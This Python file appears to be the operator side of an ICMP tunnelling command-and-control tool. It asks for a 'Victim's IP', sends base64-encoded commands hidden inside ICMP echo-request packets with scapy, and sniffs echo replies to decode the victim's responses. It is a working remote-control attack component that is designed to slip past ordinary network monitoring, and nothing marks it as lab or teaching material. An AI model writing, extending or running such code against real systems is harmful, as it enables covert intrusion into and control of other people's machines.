import base64
import threading
from log import *
from scapy.all import IP, ICMP, sr1, sniff

def encode_data(data):
    return base64.b64encode(data.encode()).decode()

def send_command(target_ip, command):
    identifier = "Cmd:"  # Unique identifier
    encoded_command = encode_data(identifier + command)
    packet = IP(dst=target_ip)/ICMP(type="echo-request")/encoded_command
    sr1(packet, timeout=1, verbose=0)
    print(f"Sent command to client: {command}")

def process_packet(packet):
    if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # ICMP Echo Reply
        try:
            # Ensure payload is not empty
            if packet.load:
                encoded_response = packet.load
                response = base64.b64decode(encoded_response).decode()
                print(f"Response from client: {response}")
        except Exception as e:
            print(f"Error processing response: {e}")

def start_sniffing(target_ip):
    sniff(filter=f"icmp and src host {target_ip}", prn=process_packet)

def main():
    target_ip = input("Enter Victim's IP:")  # Replace with your client's IP address

    # Start the packet sniffing in a separate subprocess
    sniff_thread = threading.Thread(target=start_sniffing, args=(target_ip,), daemon=True)
    sniff_thread.start()

    while True:
        command = input("Enter command to send: ")
        if command.lower() == 'exit':
            break
        print(f"Sending command: {command}")
        send_command(target_ip, command)

if __name__ == "__main__":
    main()
